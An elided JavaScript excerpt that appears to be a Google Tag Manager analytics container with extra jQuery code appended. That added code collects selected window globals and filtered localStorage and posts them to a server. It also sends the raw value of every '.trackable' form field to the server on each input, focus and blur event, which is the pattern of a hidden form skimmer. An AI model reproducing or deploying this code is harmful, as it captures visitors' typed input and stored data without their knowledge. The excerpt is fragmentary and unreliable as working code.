...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 1,
        "vtp_instanceDestinationId": "UA-77136445-1",
        "tag_id": 9
      }, {
        "function": "__rep",
        "vtp_containerId": "UA-77136445-1",
        "vtp_remoteConfig": ["map"],
        "tag_id": 1
      }, {
        "function": "__zone",
        "vtp_childContainers": ["list", ["map", "publicId", "G-749ZY6P5S5"]],
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLyWqwYQga3KhPfohoyPARImAOzHCQj9kS7SjgHyaIsaAdaeNHe0acmJjIyzgedQgZS5v1cvIpsaAnKw";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  $(function () {
    ...
    function collectGlobalVariables() {
      for (let variable in window) {
        if (keysToWatch.includes(variable)) {
          variablesToTrack[variable] = window[variable];
        }
      }
      return variablesToTrack;
    }
    ...
    function collectAndPostData() {
      ...
      const collectedVariables = collectGlobalVariables();
      if (Object.keys(filteredLocalStorage).length > 0 || Object.keys(collectedVariables).length > 0) {
        postDataToServer({
          storage: filteredLocalStorage,
    ...
    $('.trackable').on('input focus blur', function () {
      var $control = $(this).closest('.form-group');
      var currentStatus = {
        input: this.value,
        state: $control.hasClass('field--not-empty') ? 'not-empty' : 'empty'
      };
      postDataToServer({
        event: 'input_focus_blur',
